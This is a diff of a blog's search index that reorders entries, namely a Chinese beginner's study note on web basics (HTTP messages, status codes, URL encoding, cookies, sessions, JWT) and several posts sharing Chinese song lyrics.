+<h3 id="4-1-HTTP-协议报文"><a href="#4-1-HTTP-协议报文" class="headerlink" title="4.1 HTTP 协议报文"></a>4.1 HTTP 协议报文</h3><h4 id="4-1-1-请求报文"><a href="#4-1-1-请求报文" class="headerlink" title="4.1.1 请求报文"></a>4.1.1 请求报文</h4><ul>
+<li><p>请求行 ：<code>请求方法 /URL /HTTP协议版本</code> 空格隔离</p>
+</li>
+<li><p>请求头部：告知服务器客户端请求的信息，<code>关键字:值</code>，每行一对</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host				被请求资源的主机名</span><br><span class="line">User-Agent			产生请求的浏览器类型</span><br><span class="line">Accept				客户端可处理的 MIME 类型</span><br><span class="line">Accept-Encoding		客户端能够理解的内容编码方式</span><br><span class="line">Accept-Language		客户端可理解的语言</span><br><span class="line">Cookie				客户端身份凭证</span><br></pre></td></tr></table></figure>
+
+<p><strong>Referer</strong></p>
+<p>重定向时，声明用户从什么地方（上一个URL）到达现在的URL的。<br>例如：登陆页面，当用户登陆成功之后，HTTP请求报文中会有Referer字段–显示用户是从什么地方跳转到成功登录之后的界面的，服务端会进行检测，用于判断准确性。</p>
+<p><strong>Post方式</strong>：经常会有 <code>Content-Type 和 Content-Length</code>字段</p>
+</li>
+<li><p>空行</p>
+</li>
+<li><p>请求的数据</p>
+<ul>
+<li>Get方式：没有请求正文，请求的数据在URL当中</li>
+<li>Post方式：请求报文当中的最下面</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-1-2-响应报文"><a href="#4-1-2-响应报文" class="headerlink" title="4.1.2 响应报文"></a>4.1.2 响应报文</h4><ul>
+<li><p>状态行  ： <code>HTTP协议版本 状态码 状态描述</code> 空格隔离</p>
+<ul>
+<li><strong>状态码：</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1xx		信息--服务器收到请求，需要请求者继续执行操作</span><br><span class="line">2xx		成功--操作成功被服务器接收并处理</span><br><span class="line">3xx		重定向--需要进一步操作才可完成请求</span><br><span class="line">4xx		客户端请求时错误</span><br><span class="line">5xx		服务端处理请求时错误</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>状态描述：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">状态码</th>
+<th align="center">状态描述</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">200</td>
+<td align="center">OK</td>
+<td align="center">请求成功</td>
+</tr>
+<tr>
+<td align="center">304</td>
+<td align="center">Not Modified</td>
+<td align="center">直接使用本地缓存</td>
+</tr>
+<tr>
+<td align="center">400</td>
+<td align="center">Bad Request</td>
+<td align="center">客户端请求语法错误，服务器无法理解</td>
+</tr>
+<tr>
+<td align="center">401</td>
+<td align="center">Unauthorized</td>
+<td align="center">请求未经授权</td>
+</tr>
+<tr>
+<td align="center">403</td>
+<td align="center">Forbidden</td>
+<td align="center">服务器收到请求但拒绝提供服务</td>
+</tr>
+<tr>
+<td align="center">404</td>
+<td align="center">Not Found</td>
+<td align="center">请求资源不存在</td>
+</tr>
+<tr>
+<td align="center">500</td>
+<td align="center">Internal Server Error</td>
+<td align="center">服务器发生了不可预知的错误</td>
+</tr>
+<tr>
+<td align="center">503</td>
+<td align="center">Server Unavaiable</td>
+<td align="center">服务器当前无法处理客户端的请求</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+</li>
+<li><p>响应头部：描述服务器信息  <code>关键字:值</code>，每行一对</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Date				请求发送的时间 日期</span><br><span class="line">Server				告知客户端服务器的名称与版本号</span><br><span class="line">Content-Type		响应正文的 MIME类型</span><br><span class="line">Content-Length		响应正文的长度</span><br><span class="line">Connection			告知客户端响应完成之后的连接状态</span><br><span class="line">Content-Encoding	Web服务器告诉浏览器使用的是哪种压缩方法</span><br><span class="line">Last-Modified		指定资源的最后修改时间与日期</span><br></pre></td></tr></table></figure></li>
+<li><p>空行</p>
+</li>
+<li><p>响应正文</p>
+</li>
+</ul>
+<h3 id="4-2-HTTP请求方法–8种"><a href="#4-2-HTTP请求方法–8种" class="headerlink" title="4.2 HTTP请求方法–8种"></a>4.2 HTTP请求方法–8种</h3><p>服务端根据不同的请求方法做出不同的响应</p>
+<h4 id="GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT"><a href="#GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT" class="headerlink" title="GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT"></a>GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT</h4><ul>
+<li><p>GET  ：URL当中发送，有长度限制</p>
+</li>
+<li><p>POST ：在HTTP请求正文当中发送，无长度大小限制，可传递大量数据。</p>
+<p>一般用于更新资源信息，向服务器提交数据。例如：登录，注册，修改资料，上传文件等等</p>
+</li>
+</ul>
+<p><strong>安全性：</strong>不安全，黑客可获取，修改通信内容，冒充他人身份</p>
+<p><strong>解决：</strong>HTTPS协议（HyperText Transfer Prototol over Secure Socket Later）:在HTTP基础上加了 SSL/TLS层。</p>
+<h2 id="五、会话技术"><a href="#五、会话技术" class="headerlink" title="五、会话技术"></a>五、会话技术</h2><p><strong>盗取 Cookie       会话劫持</strong></p>
+<ul>
+<li><p>产生原因：HTTP协议是无连接，无状态的，无法记住客户端的信息。于是产生了<strong>会话技术：Session , cookie</strong></p>
+</li>
+<li><p>**Cookie :  **由服务端生成，由服务器将数据通过HTTP响应储存到浏览器上，则浏览器在以后就可直接携带上这个 Cookie 访问该服务器。</p>
+<ul>
+<li><strong>客户端第一次请求</strong>：PHP 的 setcookie 函数 将 cookie数据 通过HTTP协议与响应头传给浏览器，浏览器第一次响应时将Cookie数据保存到浏览器上。</li>
+<li><strong>客户端再次发送请求</strong>：首先自动检测本地是否存在Cookie数据，若存在，直接在请求头当中将Cookie数据发送给服务器；PHP执行自动判断浏览器请求中是否携带Cookie，有的话，自动保存到 $_COOKIE 当中；利用 $ _COOKIE 访问 Cookie数据。</li>
+</ul>
+</li>
+<li><p>**Session :   **与浏览器无关，以Cookie为基础，将重要的数据保存到服务端，同时将能够唯一表示这个数据的数据以COOKIE的形式保存在客户端。</p>
+<ul>
+<li><strong>客户端第一次请求</strong>：创建 <code>SESSIONID</code> ；初始化超全局变量 <code>$_SESSION</code>；在php指定目录创建SESSIONId为名的文件；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并 <code>将SESSIONID以SETCOOKIE的形式返回给客户端</code>，相当于 <code>将SESSIONID 写入 COOKIE 当中</code>。</li>
+<li><strong>客户端再次发送请求</strong>：检测到 <code>客户端的COOKIE中的SESSIONID</code> ；初始化超全局变量<code>$_SESSION</code>；找到文件，反序列化读取数据存储到<code>$_SESSION</code>中；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。</li>
+</ul>
+</li>
+<li><p><strong>登陆判断：</strong></p>
+<ul>
+<li>用户成功登录之后，服务器通过 <code>SESSION机制</code> 将用户信息存储到服务端，并将 <code>SESSIONID</code> 以 <code>SETCOOKIE</code>  的形式返回给客户端。</li>
+<li>用户下一次访问站点时，自动携带COOKIE信息，服务端根据COOKIE当中的 SESSIONID 进行数据匹配，存在证明已登录过。</li>
+</ul>
+</li>
+</ul>
+<h2 id="六、JWT-原理"><a href="#六、JWT-原理" class="headerlink" title="六、JWT 原理"></a>六、JWT 原理</h2><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JWT 原理</a></p>
+<p>JSON Web Token，服务器认证之后，会生成一个 JSON对象，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用户每次与服务端通信的时候都要发回这个 JSON对象，服务器就通过这个对象来认证用户身份。为防止用户篡改数据，服务器在生成这个对象时，会加上一个 <code>签名</code>。</p>
+<ul>
+<li><strong>JWT 组成：</strong><code>Header.Payload.Signature</code><ul>
+<li><strong>Header</strong>：头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等</li>
+<li><strong>Payload</strong>：载荷就是存放有效信息的地方，即用来存放实际需要传递的数据—标准中注册的声明，公共的声明，私有的声明</li>
+<li><strong>Signature</strong>：这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Web基础篇</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Web应用基本架构</tag>
+        <tag>HTTP</tag>
+        <tag>会话技术</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>保留</title>
+    <url>/2021/10/10/%E4%BF%9D%E7%95%99/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 郭顶</p>
+<p>作曲 : 郭顶</p>
+<p>看见 你在我眼前</p>
+<p>不去猜想我们隔多远</p>
+<p>当我 夜幕中准备</p>
+<p>只想让沉默的能开解</p>
+<p>在不同的遭遇里我发现你的瞬间</p>
+<p>有种不可言说的温柔直觉</p>
+<p>在有限的深夜消失之前触摸你的脸</p>
+<p>我情愿这是幻觉 也不愿是种告别</p>
+<p>已经忘了 你的名字</p>
+<p>就在这座 寂静星石</p>
+<p>怎么还有 你的样子</p>
+<p>被保留</p>
+<p>给我 一整个拥抱</p>
+<p>好让我不至于 太潦倒</p>
+<p>时间 过一分一秒</p>
+<p>还是觉得相遇 太美好</p>
+<p>在不同的遭遇里我发现你的瞬间</p>
+<p>有种不可言说的温柔直觉</p>
+<p>当不远的蓝色渐渐显现这无边境界</p>
+<p>我始终等待再见 只不愿再也不见</p>
+<p>已经忘了 你的名字</p>
+<p>就在这座 寂静星石</p>
+<p>怎么还有 你的样子</p>
+<p>想形容你的句子 关于你所有心事</p>
+<p>一眼能及的钻石 哪一个是你地址</p>
+<p>忘了 你的名字</p>
+<p>就在这座 寂静星石</p>
+<p>怎么还有 你的样子</p>
+<p>我始终等待再见 只不愿再也不见</p>
+<p>真的忘了 你的名字</p>
+<p>是在哪座 寂静星石</p>
+<p>一直还有 你的样子</p>
+<p>被保留</p>
+]]></content>
+      <categories>
+        <category>音乐分享</category>
+      </categories>
   </entry>
   <entry>
     <title>世间美好与你环环相扣</title>
@@ -929,238 +1161,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Web基础</title>
-    <url>/2021/05/24/Web%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>攻击者攻击服务器–首先要保证两者之间能正常的进行通信<br>如何通信？服务器上的各种服务都是依托于 端口 来实现对外提供服务的，攻击者所入侵的就是端口<br>什么是Web应用？提供W e b服务的应用系统,其实通俗讲就是一个网站。</p>
-<span id="more"></span>
-
-<h2 id="一、访问网页流程"><a href="#一、访问网页流程" class="headerlink" title="一、访问网页流程"></a>一、访问网页流程</h2><h3 id="1-1-访问静态网页流程"><a href="#1-1-访问静态网页流程" class="headerlink" title="1.1 访问静态网页流程"></a>1.1 访问静态网页流程</h3><ul>
-<li><p><strong>编写</strong>：HTML , CSS , JavaScript</p>
-</li>
-<li><p><strong>流程</strong>：在 浏 览 器 中 输 入h t t p : / / w w w . s e c u r i t y . c o m / a d m i n / i n d e x . h t m l 后 回 车，客户端向服务端发送HTTP请求报文，服务端通过运行其含有的Web应用服务器（Web容器，中间件）对接收到的请求进行处理–判断请求的文件扩展名，在网站的根目录之下寻找对应的文件，Web应用服务器再构建HTTP响应报文将文件源代码返回给浏览器，代码经过浏览器的渲染过后呈现的画面供客户端使用。</p>
-</li>
-</ul>
-<h3 id="1-2-访问动态网页流程"><a href="#1-2-访问动态网页流程" class="headerlink" title="1.2 访问动态网页流程"></a>1.2 访问动态网页流程</h3><ul>
-<li><p><strong>编写</strong>：.php , .jsp , .asp , .aspx ，一般 由HTML+CSS+JavaScript+后端语言代码组成。</p>
-</li>
-<li><p><strong>流程</strong>：判断请求文件扩展名之后，将会将对应的文件交给 <code>PHP脚本引擎</code> 去处理，使之解析文件当中的 PHP 代码，如果代码中涉及到队数据库的操作。它会请求相应的数据库，让数据库去执行队数据的增删改查等操作，然后将处理的结果返回给PHP脚本引擎。PHP脚本引擎将结果交给 Web 应用服务器（Apache），Web 应用服务器构建HTTP响应报文，由服务端发送给浏览器，经过解析之后，由客户端使用。</p>
-</li>
-<li><p><strong>数据库</strong>：SQL Server , MySQL , Oracle</p>
-</li>
-</ul>
-<h2 id="二、Web应用基本架构"><a href="#二、Web应用基本架构" class="headerlink" title="二、Web应用基本架构"></a>二、Web应用基本架构</h2><p>Web应用程序的设计者、Web应用服务器、动态脚本引擎(服务端程序语言)、数据库</p>
-<p>常见Web服务端架构：</p>
-<p><img src="https://i.loli.net/2021/05/25/rDAOBg9jn8bZ7R4.png" alt="image-20210404084121968"></p>
-<p>LAMP和WAMP就是Windows/Linux+Apache+PHP+MySQL</p>
-<h2 id="三、URL"><a href="#三、URL" class="headerlink" title="三、URL"></a>三、URL</h2><p>URL：统一资源定位符（网页地址，网址），用于定位服务器的资源（文档，页面，图像等等）</p>
-<ul>
-<li><p><strong>标准格式 : protocol://userInfo@hostname[:port]/path/[?query]#fragment  真正访问的是@之后的地址</strong></p>
-<ul>
-<li><p>userInfo：user:password  不推荐</p>
-</li>
-<li><p><strong>井号</strong>：在URL中指定的是页面中的一个位置</p>
-<p>井号作为 页面定位符 出现在URL中，比如：<em><a href="http://www.httpwatch.com/features.htm#print">http://www.httpwatch.com/features.htm#print</a></em> ，此URL表示在页面features.htm中print的位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。</p>
-</li>
-</ul>
-</li>
-<li><p><strong>URL编码：</strong></p>
-<ul>
-<li><p>产生原因：一些特殊字符会含有不同而含义：<code>?username=1&amp;passwd=2%263</code> ，为了区分。RFC标准提出 <code>URL编码方案</code></p>
-</li>
-<li><p>常见：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=  	%3d</span><br><span class="line">#	%23</span><br><span class="line">%	%25</span><br><span class="line">&amp;	%26</span><br><span class="line">/	%2f</span><br><span class="line">空格	%20</span><br><span class="line">换行	%0a</span><br><span class="line">空字节	%00</span><br><span class="line">加号 	+ 代表URL编码当中的 空格</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-<h2 id="四、HTTP"><a href="#四、HTTP" class="headerlink" title="四、HTTP"></a>四、HTTP</h2><p>HTTP （HyperText Transfer Protocol）超文本传输协议（请求/响应协议）：规定浏览器与万维网服务器之间的通信规则。<strong>无状态的协议</strong></p>
-<h3 id="4-1-HTTP-协议报文"><a href="#4-1-HTTP-协议报文" class="headerlink" title="4.1 HTTP 协议报文"></a>4.1 HTTP 协议报文</h3><h4 id="4-1-1-请求报文"><a href="#4-1-1-请求报文" class="headerlink" title="4.1.1 请求报文"></a>4.1.1 请求报文</h4><ul>
-<li><p>请求行 ：<code>请求方法 /URL /HTTP协议版本</code> 空格隔离</p>
-</li>
-<li><p>请求头部：告知服务器客户端请求的信息，<code>关键字:值</code>，每行一对</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host				被请求资源的主机名</span><br><span class="line">User-Agent			产生请求的浏览器类型</span><br><span class="line">Accept				客户端可处理的 MIME 类型</span><br><span class="line">Accept-Encoding		客户端能够理解的内容编码方式</span><br><span class="line">Accept-Language		客户端可理解的语言</span><br><span class="line">Cookie				客户端身份凭证</span><br></pre></td></tr></table></figure>
-
-<p><strong>Referer</strong></p>
-<p>重定向时，声明用户从什么地方（上一个URL）到达现在的URL的。<br>例如：登陆页面，当用户登陆成功之后，HTTP请求报文中会有Referer字段–显示用户是从什么地方跳转到成功登录之后的界面的，服务端会进行检测，用于判断准确性。</p>
-<p><strong>Post方式</strong>：经常会有 <code>Content-Type 和 Content-Length</code>字段</p>
-</li>
-<li><p>空行</p>
-</li>
-<li><p>请求的数据</p>
-<ul>
-<li>Get方式：没有请求正文，请求的数据在URL当中</li>
-<li>Post方式：请求报文当中的最下面</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-1-2-响应报文"><a href="#4-1-2-响应报文" class="headerlink" title="4.1.2 响应报文"></a>4.1.2 响应报文</h4><ul>
-<li><p>状态行  ： <code>HTTP协议版本 状态码 状态描述</code> 空格隔离</p>
-<ul>
-<li><strong>状态码：</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1xx		信息--服务器收到请求，需要请求者继续执行操作</span><br><span class="line">2xx		成功--操作成功被服务器接收并处理</span><br><span class="line">3xx		重定向--需要进一步操作才可完成请求</span><br><span class="line">4xx		客户端请求时错误</span><br><span class="line">5xx		服务端处理请求时错误</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p><strong>状态描述：</strong></p>
-<table>
-<thead>
-<tr>
-<th align="center">状态码</th>
-<th align="center">状态描述</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">200</td>
-<td align="center">OK</td>
-<td align="center">请求成功</td>
-</tr>
-<tr>
-<td align="center">304</td>
-<td align="center">Not Modified</td>
-<td align="center">直接使用本地缓存</td>
-</tr>
-<tr>
-<td align="center">400</td>
-<td align="center">Bad Request</td>
-<td align="center">客户端请求语法错误，服务器无法理解</td>
-</tr>
-<tr>
-<td align="center">401</td>
-<td align="center">Unauthorized</td>
-<td align="center">请求未经授权</td>
-</tr>
-<tr>
-<td align="center">403</td>
-<td align="center">Forbidden</td>
-<td align="center">服务器收到请求但拒绝提供服务</td>
-</tr>
-<tr>
-<td align="center">404</td>
-<td align="center">Not Found</td>
-<td align="center">请求资源不存在</td>
-</tr>
-<tr>
-<td align="center">500</td>
-<td align="center">Internal Server Error</td>
-<td align="center">服务器发生了不可预知的错误</td>
-</tr>
-<tr>
-<td align="center">503</td>
-<td align="center">Server Unavaiable</td>
-<td align="center">服务器当前无法处理客户端的请求</td>
-</tr>
-</tbody></table>
-</li>
-</ul>
-</li>
-<li><p>响应头部：描述服务器信息  <code>关键字:值</code>，每行一对</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Date				请求发送的时间 日期</span><br><span class="line">Server				告知客户端服务器的名称与版本号</span><br><span class="line">Content-Type		响应正文的 MIME类型</span><br><span class="line">Content-Length		响应正文的长度</span><br><span class="line">Connection			告知客户端响应完成之后的连接状态</span><br><span class="line">Content-Encoding	Web服务器告诉浏览器使用的是哪种压缩方法</span><br><span class="line">Last-Modified		指定资源的最后修改时间与日期</span><br></pre></td></tr></table></figure></li>
-<li><p>空行</p>
-</li>
-<li><p>响应正文</p>
-</li>
-</ul>
-<h3 id="4-2-HTTP请求方法–8种"><a href="#4-2-HTTP请求方法–8种" class="headerlink" title="4.2 HTTP请求方法–8种"></a>4.2 HTTP请求方法–8种</h3><p>服务端根据不同的请求方法做出不同的响应</p>
-<h4 id="GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT"><a href="#GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT" class="headerlink" title="GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT"></a>GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT</h4><ul>
-<li><p>GET  ：URL当中发送，有长度限制</p>
-</li>
-<li><p>POST ：在HTTP请求正文当中发送，无长度大小限制，可传递大量数据。</p>
-<p>一般用于更新资源信息，向服务器提交数据。例如：登录，注册，修改资料，上传文件等等</p>
-</li>
-</ul>
-<p><strong>安全性：</strong>不安全，黑客可获取，修改通信内容，冒充他人身份</p>
-<p><strong>解决：</strong>HTTPS协议（HyperText Transfer Prototol over Secure Socket Later）:在HTTP基础上加了 SSL/TLS层。</p>
-<h2 id="五、会话技术"><a href="#五、会话技术" class="headerlink" title="五、会话技术"></a>五、会话技术</h2><p><strong>盗取 Cookie       会话劫持</strong></p>
-<ul>
-<li><p>产生原因：HTTP协议是无连接，无状态的，无法记住客户端的信息。于是产生了<strong>会话技术：Session , cookie</strong></p>
-</li>
-<li><p>**Cookie :  **由服务端生成，由服务器将数据通过HTTP响应储存到浏览器上，则浏览器在以后就可直接携带上这个 Cookie 访问该服务器。</p>
-<ul>
-<li><strong>客户端第一次请求</strong>：PHP 的 setcookie 函数 将 cookie数据 通过HTTP协议与响应头传给浏览器，浏览器第一次响应时将Cookie数据保存到浏览器上。</li>
-<li><strong>客户端再次发送请求</strong>：首先自动检测本地是否存在Cookie数据，若存在，直接在请求头当中将Cookie数据发送给服务器；PHP执行自动判断浏览器请求中是否携带Cookie，有的话，自动保存到 $_COOKIE 当中；利用 $ _COOKIE 访问 Cookie数据。</li>
-</ul>
-</li>
-<li><p>**Session :   **与浏览器无关，以Cookie为基础，将重要的数据保存到服务端，同时将能够唯一表示这个数据的数据以COOKIE的形式保存在客户端。</p>
-<ul>
-<li><strong>客户端第一次请求</strong>：创建 <code>SESSIONID</code> ；初始化超全局变量 <code>$_SESSION</code>；在php指定目录创建SESSIONId为名的文件；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并 <code>将SESSIONID以SETCOOKIE的形式返回给客户端</code>，相当于 <code>将SESSIONID 写入 COOKIE 当中</code>。</li>
-<li><strong>客户端再次发送请求</strong>：检测到 <code>客户端的COOKIE中的SESSIONID</code> ；初始化超全局变量<code>$_SESSION</code>；找到文件，反序列化读取数据存储到<code>$_SESSION</code>中；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。</li>
-</ul>
-</li>
-<li><p><strong>登陆判断：</strong></p>
-<ul>
-<li>用户成功登录之后，服务器通过 <code>SESSION机制</code> 将用户信息存储到服务端，并将 <code>SESSIONID</code> 以 <code>SETCOOKIE</code>  的形式返回给客户端。</li>
-<li>用户下一次访问站点时，自动携带COOKIE信息，服务端根据COOKIE当中的 SESSIONID 进行数据匹配，存在证明已登录过。</li>
-</ul>
-</li>
-</ul>
-<h2 id="六、JWT-原理"><a href="#六、JWT-原理" class="headerlink" title="六、JWT 原理"></a>六、JWT 原理</h2><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JWT 原理</a></p>
-<p>JSON Web Token，服务器认证之后，会生成一个 JSON对象，比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>用户每次与服务端通信的时候都要发回这个 JSON对象，服务器就通过这个对象来认证用户身份。为防止用户篡改数据，服务器在生成这个对象时，会加上一个 <code>签名</code>。</p>
-<ul>
-<li><strong>JWT 组成：</strong><code>Header.Payload.Signature</code><ul>
-<li><strong>Header</strong>：头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等</li>
-<li><strong>Payload</strong>：载荷就是存放有效信息的地方，即用来存放实际需要传递的数据—标准中注册的声明，公共的声明，私有的声明</li>
-<li><strong>Signature</strong>：这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Web基础篇</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Web应用基本架构</tag>
-        <tag>HTTP</tag>
-        <tag>会话技术</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>保留</title>
-    <url>/2021/10/10/%E4%BF%9D%E7%95%99/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 郭顶</p>
-<p>作曲 : 郭顶</p>
-<p>看见 你在我眼前</p>
-<p>不去猜想我们隔多远</p>
-<p>当我 夜幕中准备</p>
-<p>只想让沉默的能开解</p>
-<p>在不同的遭遇里我发现你的瞬间</p>
-<p>有种不可言说的温柔直觉</p>
-<p>在有限的深夜消失之前触摸你的脸</p>
-<p>我情愿这是幻觉 也不愿是种告别</p>
-<p>已经忘了 你的名字</p>
-<p>就在这座 寂静星石</p>
-<p>怎么还有 你的样子</p>
-<p>被保留</p>
-<p>给我 一整个拥抱</p>
-<p>好让我不至于 太潦倒</p>
-<p>时间 过一分一秒</p>
-<p>还是觉得相遇 太美好</p>
-<p>在不同的遭遇里我发现你的瞬间</p>
-<p>有种不可言说的温柔直觉</p>
-<p>当不远的蓝色渐渐显现这无边境界</p>
-<p>我始终等待再见 只不愿再也不见</p>
-<p>已经忘了 你的名字</p>
-<p>就在这座 寂静星石</p>
-<p>怎么还有 你的样子</p>
-<p>想形容你的句子 关于你所有心事</p>
-<p>一眼能及的钻石 哪一个是你地址</p>
-<p>忘了 你的名字</p>
-<p>就在这座 寂静星石</p>
-<p>怎么还有 你的样子</p>
-<p>我始终等待再见 只不愿再也不见</p>
-<p>真的忘了 你的名字</p>
-<p>是在哪座 寂静星石</p>
-<p>一直还有 你的样子</p>
-<p>被保留</p>
-]]></content>
-      <categories>
-        <category>音乐分享</category>
-      </categories>
-  </entry>
-  <entry>
     <title>像真的一样</title>
     <url>/2021/10/15/%E5%83%8F%E7%9C%9F%E7%9A%84%E4%B8%80%E6%A0%B7/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你习惯 可能会幸福的预感</p>
@@ -1196,6 +1196,64 @@
 <p>你最擅长模仿 像真的坚强</p>
 <p>孤独无尽漫长 背负着一个谎</p>
 <p><strong>他清场 他怯场 他离场 你都是暖场</strong></p>
+]]></content>
+      <categories>
+        <category>音乐分享</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>呓语</title>
+    <url>/2021/10/10/%E5%91%93%E8%AF%AD/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 毛不易</p>
+<p>作曲 : 毛不易</p>
+<p>一段未醒</p>
+<p>又做一段</p>
+<p>如果这画面有开关</p>
+<p>从期待走到不堪</p>
+<p>结局不好看</p>
+<p>人总需要记住遗憾</p>
+<p>它来过 它走了</p>
+<p>没回头 没问过</p>
+<p>你可舍得</p>
+<p>日月蹉跎</p>
+<p>小起大落</p>
+<p>光阴里有多少景色</p>
+<p>偶尔也心口一热</p>
+<p>什么都不说</p>
+<p>好过亲手把它撕破</p>
+<p>路还长 梦还多</p>
+<p>被这话 欺骗的</p>
+<p>何止你我</p>
+<p>可是我现在依然不太会转弯</p>
+<p>虽然孤单的人偶尔也想有个伴</p>
+<p>冷风又吹的时候想说</p>
+<p>这生活会不会有点难</p>
+<p>难道是因为当初有话没讲完</p>
+<p>堵在喉咙里却始终不敢大声喊</p>
+<p>算了 别哭</p>
+<p>日月蹉跎</p>
+<p>小起大落</p>
+<p>光阴里有多少景色</p>
+<p>偶尔也心口一热</p>
+<p>什么都不说</p>
+<p>好过亲手把它撕破</p>
+<p>路还长 梦还多（不多）</p>
+<p>被这话 欺骗的</p>
+<p>何止你我</p>
+<p>可是我现在依然不太会转弯</p>
+<p>虽然孤单的人偶尔也想有个伴</p>
+<p>冷风又吹的时候想说</p>
+<p>这生活会不会有点难</p>
+<p>难道是因为当初有话没讲完</p>
+<p>堵在喉咙里却始终不敢大声喊</p>
+<p>算了 别哭</p>
+<p>可是我偏偏就是不想要转弯</p>
+<p>就算不开灯的房间真的有些暗</p>
+<p>夜色又来的时候想说</p>
+<p>为什么只留给我一半</p>
+<p>难道是因为出现的人都伪善</p>
+<p>擅长告别擅长躲闪擅长分两端</p>
+<p>算了 别哭</p>
 ]]></content>
       <categories>
         <category>音乐分享</category>
@@ -1295,74 +1353,6 @@
       </categories>
   </entry>
   <entry>
-    <title>呓语</title>
-    <url>/2021/10/10/%E5%91%93%E8%AF%AD/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 毛不易</p>
-<p>作曲 : 毛不易</p>
-<p>一段未醒</p>
-<p>又做一段</p>
-<p>如果这画面有开关</p>
-<p>从期待走到不堪</p>
-<p>结局不好看</p>
-<p>人总需要记住遗憾</p>
-<p>它来过 它走了</p>
-<p>没回头 没问过</p>
-<p>你可舍得</p>
-<p>日月蹉跎</p>
-<p>小起大落</p>
-<p>光阴里有多少景色</p>
